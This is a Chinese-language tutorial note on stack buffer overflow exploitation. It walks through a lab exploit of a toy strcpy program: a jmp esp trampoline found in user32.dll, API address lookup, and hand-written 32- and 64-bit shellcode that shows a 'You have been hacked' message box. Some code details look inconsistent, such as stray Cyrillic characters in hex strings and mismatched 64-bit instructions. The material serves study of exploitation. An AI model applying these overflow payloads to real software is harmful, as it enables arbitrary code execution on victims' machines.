## 目录
+   [缓冲区溢出](#_233)
    +   [栈溢出原理](#_236)
    +   [栈溢出攻击](#_260)
    +   [ShellCode](#ShellCode_266)
+   [总结](#_462)

* 缓冲区是内存中存放数据的地方，缓冲区溢出漏洞是指在程序试图将数据放到及其内存中的某一个位置的时候，因为没有足够的空间就会发生缓冲区溢出的现象。
* C 语言中，指针和数组越界不保护是 Buffer overflow 的根源，在 C 语言标准库中就有许多能提供溢出的函数，如 strcat(), strcpy(), sprintf(), vsprintf(), bcopy(), gets() 和 scanf()。
* **Buffer Overflow 攻击不需要太多的先决条件且杀伤力很强（可形成远程任意命令执行）；防火墙在 Buffer Overflows 攻击面前也往往无效。
* 前置知识
	* [[汇编语言#函数调用]]
	* 软件安全:漏洞利用及渗透测试（南开大学，刘哲理：[货拉拉拉不拉拉卜拉多的个人空间-货拉拉拉不拉拉卜拉多个人主页-哔哩哔哩视频](https://space.bilibili.com/482235738)）

## 缓冲区溢出

### 栈溢出原理

当函数内的一个数组缓冲区接受用户输入的时候，**一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！** 比如下边的函数：

```c
void msg_display(char * data)
{
    char buffer[200];
    strcpy(buffer,data);
}
```

这个函数分配了 200 个字节的缓冲区，然后通过 strcpy 函数将传进来的字符串复制到缓冲区中，最后输出。
**如果传入的字符串大于 200 的话就会发生溢出，并向后覆盖堆栈中的信息
如果只是一些乱码的话那个最多造成程序崩溃
如果传入的是一段精心设计的代码，那么计算机可能回去执行这段攻击代码。**
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8a3d343d96fad368fe0cf1c804c5a3b6.png)


**由于栈是低地址方向增长的，因此局部数组 buffer 的指针在缓冲区的下方。当把 data 的数据拷贝到 buffer 内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：**

1.  淹没了其他的局部变量：如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程；
2.  淹没了父函数栈底指针 ebp 的值：修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡；
3.  **淹没了返回地址：这是栈溢出原理的核心所在**，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！
4.  淹没参数变量：修改函数的参数变量也可能改变当前函数的执行结果和流程；
5.  淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。

综上所述，如果在 data 本身的数据内就保存了**一系列的指令的二进制代码（shellcode）**，**一旦栈溢出时修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/112131f3a34fdc2a72cd8ec75e87613c.png)  


* 攻击者通过计算返回地址内存区域相对于 buffer 的偏移，并在对应位置构造新的地址指向 buffer 内部二进制代码的其实位置，便能执行用户的自定义代码！
* **这段既是代码又是数据的二进制数据被称为 Shellcode，因为攻击者希望通过这段代码打开系统的 shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。**

### 栈溢出攻击

#### 攻击难点
上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现，因为操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。
#### 解决方案
攻击者需要其他方法来确保程序能执行到正确的地址（即准确地定位 Shellcode 的地址），需要借助一些额外的操作，其中最经典的是**借助跳板的栈溢出方式。**

#### 攻击思路（重点）

* 利用的关键点：根据“汇编语言-函数调用”部分的知识，函数执行后，栈指针 esp 会恢复到调用该函数时压入参数时的状态，在上图中即 data 区域（函数参数）的地址。
* 跳板：如果在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令 `jmp esp`（跳转指令）。那么函数返回后，会执行该指令并跳转到 esp 所在的位置——即 data（函数参数) 的位置。
* shellcode的位置：可以将缓冲区再多溢出一部分，淹没 data 这样的函数参数，并在这里放上我们想要执行的代码shellcode。

这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6950f1ebec9c3b20045f7bf85e70a6d6.png)



### ShellCode

下面学习 [i春秋的教学视频](https://www.bilibili.com/video/BV1oi4y1G7RZ?p=1%29) ，通过利用一个程序漏洞，演示如何编写 Shellcode，来达成最终的攻击效果：蹦出对话框并显示“You have been hacked!(by JWM)”。带有漏洞的程序如下：

```c
#include "stdio.h"
#include "string.h"
char name[] = "jiangye";
int main()
{
  char buffer[8];
  strcpy(buffer, name);
  printf("%s",buffer);
  getchar();
  return 0;
}
```

**（1）选取跳板**

* 借助跳板的确可以很好的解决栈帧移位（栈加载地址不固定）的问题，下面需要寻找合适的跳板指令。
* 跳板指令来源：在 Windows 操作系统加载的大量 dll 中，包含了许多这样的跳板指令
	* **kernel32.dll，ntdll.dll：这两个动态链接库是 Windows 程序默认加载的**。
	* 如果是图形化界面的 Windows 程序还会加载 user32.dll，它也包含了大量的跳板指令
	* **Windows 操作系统加载 dll 时候一般都是固定地址，因此这些 dll 内的跳板指令的地址一般都是固定的**
* **跳板指令地址获取：可以离线搜索出跳板执行在 dll 内的偏移，并加上 dll 的加载地址，便得到一个适用的跳板指令地址**
* jmp esp 指令的二进制表示：`0xffe4`


下面的搜索算法程序实现了在 user32.dll 中查找 jmp esp 这条指令的地址（jmp esp 在很多动态链接库中都存在，这里以 user32.dll 作为例子）。由于 **jmp esp 指令的二进制表示为`0xffe4`**，因此搜索算法就是搜索 dll 内这样的字节数据即可。  

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
        BYTE *ptr;
        int position;
        HINSTANCE handle;
        BOOL done_flag = FALSE;
    
        handle = LoadLibrary("user32.dll");
        if(!handle)
        {
                printf("load dll error!");
                exit(0);
        }
        ptr = (BYTE*)handle;

        for(position = 0; !done_flag; position++)
        {
                if(ptr[position]==0xFF && ptr[position+1]==0xE4)
                        {
                                int address = (int)ptr + position;
                                printf("OPCODE found at 0x%x\n", address);
                        }
                /*
                // c语言好像不支持try catch
                try
                {
                        if(ptr[position]==0xFF && ptr[position+1]==0xE4)
                        {
                                int address = (int)ptr + position;
                                printf("OPCODE found at 0x%x\n", address);
                        }
                }
                catch(...)
                {
                        int address = (int)ptr + position;
                        printf("END OF 0x%x\n", address);
                        done_flag = true;
                }
                */
        }
        getchar();
        return 0;
}
```


报错，但是执行结果如下：
![[Pasted image 20241228212619.png]]


随便取出一个结果用于实验。这里我选择的是第一行的`0x1697302b`。也就是说，需要使用这个地址来覆盖程序的返回地址。这样，程序在返回时，就会执行 jmp esp，从而跳到返回地址下一个位置去执行该地址处的语句。

总结一下即将要编写的程序中 “name” 数组(buffer数组大小为8字节，利用溢出部分覆盖返回地址，实现利用)中的内容，经过分析可以知道，其形式为 AAAAAAAAAAAAXXXXSSSS……SSSS（A区域有12字节，X区域有4字节，S区域长度不确定）：
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6950f1ebec9c3b20045f7bf85e70a6d6.png)

1.  其中前 12 个字符为任意字符（buffer是8字节；和buffer缓冲区紧临向高地址方向增长的4个字节是ebp，即第 9-12 位是为了填充覆盖 ret 指令前存储的父函数 EBP 的值）；
2.  XXXX 为返回地址（即前面用搜算算法找到的跳板指令地址）；
3.  而 SSSS 是想要让计算机执行的代码（即需要构造的执行弹窗的 ShellCode）。

**（2）获取 Shellcode 中 API 函数（弹窗）以及退出函数ExitProcess的地址**

弹窗程序的参数：
``` C++
int MessageBox(
  HWND   hWnd,      // 父窗口的句柄，通常为 NULL
  LPCSTR lpText,    // 要显示的消息文本
  LPCSTR lpCaption, // 消息框的标题
  UINT   uType      // 消息框的类型（如按钮、图标等）
);
```

下面的工作就是让存在着缓冲区溢出漏洞的程序显示这么一个对话框。由于在这里想要调用`MessageBox()`这个 API 函数，所以**首先需要获取该函数的地址**，这可以通过编写一个小程序来获取：

```c
#include <windows.h>
#include <stdio.h>
typedef void (*MYPROC)(LPTSTR);
void SearchMessageBoxAPIAddress()
{

        HINSTANCE LibHandle;
        MYPROC ProcAdd;
        LibHandle = LoadLibrary("user32");
        //获取user32.dll的地址
        printf("user32 = 0x%x\n", LibHandle);
        //获取MessageBoxA的地址
        ProcAdd=(MYPROC)GetProcAddress(LibHandle,"MessageBoxA");
        printf("MessageBoxA = 0x%x\n", ProcAdd);
        getchar();
}
```


效果如下，即0x8cd78b70：  
![[Pasted image 20250104213415.png]]



获取ExitProcess函数的地址：
``` C++
void SearchExitProcessAPIAddress() {
    // 获取 kernel32.dll 模块句柄
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    // 获取 ExitProcess 函数的地址
    ExitProcessFunc pExitProcess = (ExitProcessFunc)GetProcAddress(hKernel32, "ExitProcess");
    if (pExitProcess != NULL) {
        printf("ExitProcess = 0x%x\n", pExitProcess);
        // 退出进程
        pExitProcess(0);
    } else {
        printf("无法获取 ExitProcess 地址\n");
    }
}
```

结果如下：
```
ExitProcess = 0x8cebe3e0
```

**（3）编写汇编代码**
将写汇编之前罗列必要信息： 

information needed:

``` txt
jmp esp:0x1697302b
messageBoxA:0x8cd78b70

ExitProcess:0x8cebe3e0  //不确定是不是，用程序查找到的地址

Waring:
\x57\x61\x72\x6e
\x69\xбe\x67\x20


You have been hacked!(by JWM)
\x59\x6f\x75\x20
\x68\x61\x76\x65
\x20\x62\x65\x65
\xбe\x20\x68\x61
\x63\x6b\x65\x64
\x21\x28\x62\x79
\x20\x4a\x77\x6d
\x29\x20\x20\x20
```

assembly code(64位):

```c
int main()
{
 _asm{
  sub rsp,0x50  //抬高栈帧，80字节
  xor rbx,rbx   //清零，该指令将 ebx 寄存器的值置为零。xor 是按位异或操作，两个相同的值进行异或结果是0。

  push rbx     // 分割字符串，这条指令通常用于分割或标记数据，或者作为占位符。

  push 0x20676e69   // push "Warning"
  push 0x6e726157    
  mov rax,rsp   //用eax存放“Warning”的指针

  push rbx             // 分割字符串  
  push 0x20202029     // push "You have been hacked!(by Jwm)"
  push 0x6d774a20
  push 0x79622821
  push 0x64656b63
  push 0x6168206e
  push 0x65656220
  push 0x65766168
  push 0x20756f59   
  mov rcx,rsp      //用ecx存放该字符串的指针    
  
  push rbx    //MessageBox函数参数依次入栈
  push rax
  push rcx
  push rbx   
  mov rax,0x8cd78b70
  call rax        // call MessageBox

  push rbx  //ExitProcess函数参数入栈
  mov rax, 0x8cebe3e0
  call rax       // call ExitProcess
 }
 return 0;
}
```

原版32位机器的汇编代码见：[[#assembly code(32位)]


**（4）得到 Shellcode 机器码**

将机器码(pwntools)写入漏洞程序的数组中(64位)：

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
char name[] = "\x41\x41\x41\x41\x41\x41\x41\x41"  // name[0]~name[7]
     "\x41\x41\x41\x41"                      // to Overlap EBP
     "\x2B\x30\x97\x16"                      // Return Address(Address of "Jmp eax")                        
     "\x48\x83\xec\x50"           // sub rsp,0x50                           
     "\x48\x31\xdb"   // xor rbx,rbx
     "\x53"   // push rbx
     "\x68\x69\x6e\x67\x20"       // push "Warning"
     "\x68\x57\x61\x72\x6e"      
     "\x48\x89\xe0"               // mov rax,rsp
     "\x53"                                      // push rbx
     "\x68\x29\x20\x20\x20"
     "\x68\x20\x4a\x77\x6d"
     "\x68\x21\x28\x62\x79"
     "\x68\x63\x6b\x65\x64"
     "\x68\x6e\x20\x68\x61"
     "\x68\x20\x62\x65\x65"
     "\x68\x68\x61\x76\x65"
     "\x68\x59\x6f\x75\x20"  // push "You have been hacked!(by Jwm)"
     "\x48\x89\xe1"                   // mov rcx,rsp
     "\x53"                          // push rbx
     "\x50"                          // push rax
     "\x51"                          // push rcx
     "\x53"                          // push rbx
     "\x48\xb8\x70\x8b\xd7\x8c\x00\x00\x00\x00"
     "\xff\xd0"         // call MessageBox
     "\x53"
     "\x48\xb8\xe0\xe3\xeb\x8c\x00\x00\x00\x00"
     "\xFF\xD0";            // call ExitProcess

int main()
{
     char warning_str[] = "\x57\x61\x72\x6E"
     "\x69\x6E\x67\x20";
     printf("%s\n",warning_str);
     char hacked_str[] = "\x59\x6f\x75\x20"
     "\x68\x61\x76\x65"
     "\x20\x62\x65\x65"
     "\x6e\x20\x68\x61"
     "\x63\x6b\x65\x64"
     "\x21\x28\x62\x79"
     "\x20\x4a\x77\x6d"
     "\x29\x20\x20\x20";
     printf("%s\n",hacked_str);
     
     char buffer[8];
     strcpy(buffer, name);
     printf("%s",buffer);
     getchar();
     return 0;
}
```


原版32位机器的机器码如下：[[#漏洞程序数组中的机器码(32位)：]]



为了使调试的二进制文件 `./hacknote` **有符号表**（通常是调试信息），需要在该文件被编译时启用调试选项（例如，未使用 `-g` 编译选项）：
```shell
gcc -g -o BufferOverflow BufferOverflow.c
```

```
gdb
file ./BufferOverflow
```
设置断点，以行设置的方式如下：
```shell
break BufferOverflow.c:38
```

最终成果达到漏洞利用——当输入回车，main 执行完 getchar()，即将退出时，跳转到修改过的返回地址，随即通过跳板执行当前 ESP 指向的指令（即Shellcode），触发如下弹窗：  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/1d98e93c8ccf4564b408d5b410a0bfdc.png)**（5）OllyDBG 验证**  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/52b80f02ddcb8283b40896332a9dcc58.png)明显看出 name\[\] 数组时怎样溢出、覆盖的。





---



## 总结

为了在系统中插入攻击代码，攻击者既要插入代码，也要插入指向这段代码的指针。这个指针也是攻击字符串的一部分。产生这个指针需要知道这个字符串放置的栈地址。在过去，程序的栈地址非常容易预测。对于所有运行同样程序和操作系统版本的系统来说，在不同的机器之间，栈的位置是相当固定的。因此，如果攻击者可以确定一个常见的Web服务器所使用的栈空间，就可以设计一个在许多机器上都能实施的攻击。

## 参考文章

1.  [缓冲区溢出漏洞](https://cloud.tencent.com/developer/article/1395248)；
2.  [缓冲区溢出攻击](https://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html);
3.  [网络攻防实战技术之——缓冲区溢出篇](https://cloud.tencent.com/developer/article/1592196)；
4.  [BiliBili视频教程——缓冲区溢出分析基础篇](https://www.bilibili.com/video/BV1oi4y1G7RZ?p=1)。


## 附录

### assembly code(32位):

```c
int main()
{
 _asm{
  sub esp,0x50  //抬高栈帧，80字节
  xor ebx,ebx   //清零，该指令将 ebx 寄存器的值置为零。xor 是按位异或操作，两个相同的值进行异或结果是0。
  push ebx     // 分割字符串，这条指令通常用于分割或标记数据，或者作为占位符。

  push 0x20676e69   // push "Warning"
  push 0x6e726157    
  mov eax,esp   //用eax存放“Warning”的指针

  push ebx             // 分割字符串  
  push 0x20202029     // push "You have been hacked!(by Jwm)"
  push 0x6d774a20
  push 0x79622821
  push 0x64656b63
  push 0x6168206e
  push 0x65656220
  push 0x65766168
  push 0x20756f59   
  mov ecx,esp      //用ecx存放该字符串的指针    

  push ebx    //MessageBox函数参数依次入栈
  push eax
  push ecx
  push ebx   
  mov eax,0x8cd78b70
  call eax        // call MessageBox

  push ebx  //ExitProcess函数参数入栈
  mov eax, 0x8cebe3e0
  call eax       // call ExitProcess
 }
 return 0;
}
```



### 漏洞程序数组中的机器码(32位)：

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
char name[] = "\x41\x41\x41\x41\x41\x41\x41\x41"  // name[0]~name[7]
     "\x41\x41\x41\x41"                      // to Overlap EBP
     "\x2B\x30\x97\x16"                      // Return Address(Address of "Jmp eax")
     "\x83\xEC\x50"                           // sub esp,0x50
     "\x33\xDB"                                // xor ebx,ebx
     "\x53"                                     // push ebx
     "\x68\x69\x6E\x67\x20"
     "\x68\x57\x61\x72\x6E"                  // push "Warning"
     "\x8B\xC4"                                 // mov eax,esp
     "\x53"                                      // push ebx
     "\x68\x29\x20\x20\x20"
     "\x68\x20\x4A\x77\x6d"
     "\x68\x21\x28\x62\x79"
     "\x68\x63\x6B\x65\x64"
     "\x68\x6E\x20\x68\x61"
     "\x68\x20\x62\x65\x65"
     "\x68\x68\x61\x76\x65"
     "\x68\x59\x6F\x75\x20"   // push "You have been hacked!(by Jwm)"
     "\x8B\xCC"                        // mov ecx,esp
     "\x53"                          // push ebx
     "\x50"                          // push eax
     "\x51"                          // push ecx
     "\x53"                          // push ebx
     "\xB8\x70\x8B\xD7\x8C"           
     "\xFF\xD0"             // call MessageBox
     "\x53"
     "\xB8\xE0\xE3\xEB\x8C"
     "\xFF\xD0";            // call ExitProcess

int main()
{
     char warning_str[] = "\x57\x61\x72\x6E"
     "\x69\x6E\x67\x20";
     printf("%s\n",warning_str);
     char hacked_str[] = "\x59\x6f\x75\x20"
     "\x68\x61\x76\x65"
     "\x20\x62\x65\x65"
     "\x6e\x20\x68\x61"
     "\x63\x6b\x65\x64"
     "\x21\x28\x62\x79"
     "\x20\x4a\x77\x6d"
     "\x29\x20\x20\x20";
     printf("%s\n",hacked_str);
     
     char buffer[8];
     strcpy(buffer, name);
     printf("%s",buffer);
     getchar();
     return 0;
}
```

